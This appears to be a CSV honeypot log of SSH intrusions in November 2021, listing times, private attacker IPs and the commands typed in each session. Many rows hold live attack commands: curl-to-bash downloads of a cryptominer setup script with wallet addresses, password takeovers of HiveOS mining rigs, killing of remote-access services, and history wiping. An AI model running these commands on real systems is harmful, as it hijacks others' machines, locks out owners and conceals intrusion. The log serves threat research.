attackdate,attackerip,entrancetime,exittime,commands
2021-11-15,10.0.3.97,23:52:48.295,23:52:50.150,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-25,10.0.3.254,23:55:45.756,00:00:01.130,['scp -t /tmp/vAqPX8ga']
2021-11-16,10.0.3.68,00:50:02.515,01:00:01.243,['scp -t /tmp/cNNUcQGX']
2021-11-24,10.0.3.235,00:51:06.024,01:00:00.167,"['echo `hostname`;echo -e `hostname`n`hostname` | passwd', 'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA']"
2021-11-26,10.0.3.241,01:07:03.297,01:07:24.310,[]
2021-11-18,10.0.3.188,01:50:15.726,02:00:01.329,[]
2021-11-19,10.0.3.167,01:46:45.570,01:48:28.408,[]
2021-11-21,10.0.3.247,01:53:26.258,02:00:01.611,['/ip cloud print']
2021-11-16,10.0.3.131,02:07:01.324,02:27:42.461,[]
2021-11-17,10.0.3.121,02:11:50.537,02:29:35.417,[]
2021-11-20,10.0.3.58,02:25:08.341,02:25:28.506,['scp -t /tmp/ft19ljqs']
2021-11-17,10.0.3.114,02:39:16.083,02:53:03.497,"['sudo hive-passwd dS5mdWNraW4udHJpZWQubmlnZ2E', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c', 'cat /hive-config/rig.conf']"
2021-11-18,10.0.3.2,02:56:00.383,03:00:01.234,[]
2021-11-26,10.0.3.217,02:54:03.192,02:54:05.110,"['sudo hive-passwd dg801b23dg12dwqsdghaiodg120dgasodg1wo08_123Z', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c', 'cat /hive-config/rig.conf']"
2021-11-16,10.0.3.78,03:10:25.942,03:19:47.108,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-17,10.0.3.10,03:15:45.208,03:27:38.609,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-17,10.0.3.14,03:38:07.012,04:00:01.897,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-17,10.0.3.156,04:04:06.971,04:29:08.619,['scp -t /tmp/CCyWkiWA']
2021-11-18,10.0.3.34,04:09:17.732,04:09:18.518,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-16,10.0.3.144,04:41:12.142,05:00:01.897,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-17,10.0.3.88,04:47:08.314,05:00:01.934,[]
2021-11-18,10.0.3.137,04:49:40.457,04:58:57.335,[]
2021-11-22,10.0.3.139,04:59:40.874,04:59:41.554,['scp -t /tmp/Bu5Hk54j']
2021-11-16,10.0.3.87,05:29:56.289,05:29:58.227,[]
2021-11-17,10.0.3.85,05:28:45.372,05:30:01.085,"['ls', 'nmpproc', 'ls', 'curl', 'sudo su', 'vhserver', '[ETX][ETX][ETX]curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr[CR]', '']"
2021-11-16,10.0.3.8,05:44:07.378,06:00:01.271,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-17,10.0.3.16,05:43:33.011,06:00:01.140,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-18,10.0.3.215,05:41:31.599,06:00:01.816,['scp -t /tmp/C9xanYtV']
2021-11-16,10.0.3.189,06:09:36.731,06:09:45.174,['/ip cloud print']
2021-11-17,10.0.3.126,06:21:38.979,06:29:16.554,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-16,10.0.3.107,06:53:43.369,06:53:43.955,"['sudo hive-passwd cummingonthecumrightinfrontofthecumwhichiscummingonthecummyfloor', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-17,10.0.3.170,06:45:42.563,07:00:02.031,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-16,10.0.3.197,07:16:24.968,07:20:25.637,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-17,10.0.3.79,07:15:15.254,07:29:50.652,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-18,10.0.3.73,07:15:44.077,07:29:15.785,"['sudo hive-passwd localhost', 'echo localhost', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-26,10.0.3.25,07:13:52.155,07:24:53.802,"['sudo hive-passwd dg801b23dg12dwqsdghaiodg120dgasodg1wo08_123Z', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c', 'cat /hive-config/rig.conf']"
2021-11-16,10.0.3.30,07:39:31.241,08:00:01.792,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-18,10.0.3.139,07:58:18.297,07:58:20.158,"['sudo hive-passwd localhost', 'echo localhost', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-16,10.0.3.207,08:18:56.520,08:18:58.458,[]
2021-11-24,10.0.3.69,08:24:09.973,08:24:29.324,['scp -t /tmp/WweqbLbZ']
2021-11-16,10.0.3.116,08:42:31.808,08:56:19.627,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-18,10.0.3.198,08:55:23.200,08:55:56.376,['scp -t /tmp/b1Qxzduv']
2021-11-17,10.0.3.104,09:09:58.185,09:29:36.387,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-18,10.0.3.204,09:05:37.791,09:29:34.862,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
